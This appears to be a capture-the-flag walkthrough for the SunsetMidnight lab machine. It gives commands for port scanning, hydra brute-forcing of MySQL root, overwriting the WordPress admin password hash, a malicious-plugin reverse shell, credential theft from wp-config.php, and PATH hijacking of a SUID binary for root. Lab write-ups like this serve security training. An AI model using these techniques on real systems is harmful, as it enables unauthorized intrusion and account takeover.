# SunsetMidnight

## Nmap

```
sudo nmap 192.168.104.88 -p- -sS -sV   

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="info" %}
Add the machine IP to map to sunset-midnight in /etc/hosts.
{% endhint %}

After making the above changes when browsing to port 80 we come to a Wordpress page.

![http://sunset-midnight/](<../../../.gitbook/assets/image (1126).png>)

After scanning with WPScan I was unable to proceed with the found admin accout. Instead turning our attention to MySQL which we find does not block remote connections we can begin to brute force the root account.

```
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.104.88  
```

![](<../../../.gitbook/assets/image (1127).png>)

We can then log into MySQL with the discovered credentials:

```
mysql -u root -p -h 192.168.104.88  
```

![](<../../../.gitbook/assets/image (1128) (1).png>)

From here we can list databases then select the Wordpress database and extract information from the wp\_users table.

```
show databases;
use wordpress_db;
show tables;
select * from wp_users;
```

![](<../../../.gitbook/assets/image (1129) (1).png>)

We now have the admin hash of: `$P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/` I tried cracking with `hashcat` using rockyou.txt and had no lucky. Luckily we are root on this session so we can actually update the table and change the password to something that we know.

The following website can be used to generate a has for wordpress: [https://www.useotools.com/wordpress-password-hash-generator/output](https://www.useotools.com/wordpress-password-hash-generator/output).

After doing so run the commands below in MySQL to update the password for the admin account.

```
update wp_users
set user_pass = '$P$BDAEMk6QF.8MP6zmnILMLvQpLnNxw5.';
```

![](<../../../.gitbook/assets/image (1130).png>)

We can then move to the /wp-admin/ directory on the webserver and login with our new credentials.

![http://sunset-midnight/wp-admin/](<../../../.gitbook/assets/image (1131).png>)

From here we are going to upload a malicious plug-in that will give us a reverse shell. We will be using wordpwn.py to achieve this: [https://github.com/wetw0rk/malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin).

After download run the scripts as per instructions on the GitHub page and then once created upload the malicious.zip over at: [http://sunset-midnight/wp-admin/plugin-install.php](http://sunset-midnight/wp-admin/plugin-install.php).

Once uploaded activate the plug-in on the plug-in page then browse to the following to execute: [http://sunset-midnight/wp-content/plugins/malicious/wetw0rk\_maybe.php](http://sunset-midnight/wp-content/plugins/malicious/wetw0rk\_maybe.php).

![](<../../../.gitbook/assets/image (1133).png>)

We are now 'www-data'.

![](<../../../.gitbook/assets/image (1134) (1).png>)

Manually enumerating the target machine we know Wordpress is installed and as such the wp-config.php exists.

![](<../../../.gitbook/assets/image (1135).png>)

Reading the contents of wp-config.php gives us credentials for the user jose.

![](<../../../.gitbook/assets/image (1136).png>)

Whilst the password does look like a MD5 its important to note that this file the credentials are normally stored in plaintext. Given this we can attempt to switch to the jose user with these.

![](<../../../.gitbook/assets/image (1137).png>)

From here wen can use `ssh-keygen` to create a RSA key so we can then sign in with SSH for a much more usable shell.

```
ssh-keygen -t RSA
```

Keep hitting enter until the key is generated. Once done so copy the contents of the key from `/home/jose/.ssh/id_rsa` over to the attacking machine.

![](<../../../.gitbook/assets/image (1138).png>)

We can then use the following command to set the correct permissions on key on the attacking machine:

```
sudo chmod 600 id_rsa
```

Then login as jose over SSH.

```
ssh -i id_rsa jose@sunset-midnight
```

![](<../../../.gitbook/assets/image (1139).png>)

Running `linpeas` on the target shows the binary /usr/bin/status has the SUID bit set.

![](<../../../.gitbook/assets/image (1140).png>)

Running strings on the binary

![](<../../../.gitbook/assets/image (1141).png>)

Looks like the binary is trying to run 'service' without the full path of the binary. Knowing this we can create a malicious service binary and export the path so our malicious binary is executed first.

In the home directory of jose run the following:

```
touch service
echo '/bin/sh' > service
chmod 755 service
```

Once completed export the new path where /home/jose: is the starting path.

```
PATH=/home/jose:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

Once completed execute status and we should land a root shell.

```
/usr/bin/status
```

![](<../../../.gitbook/assets/image (1142).png>)
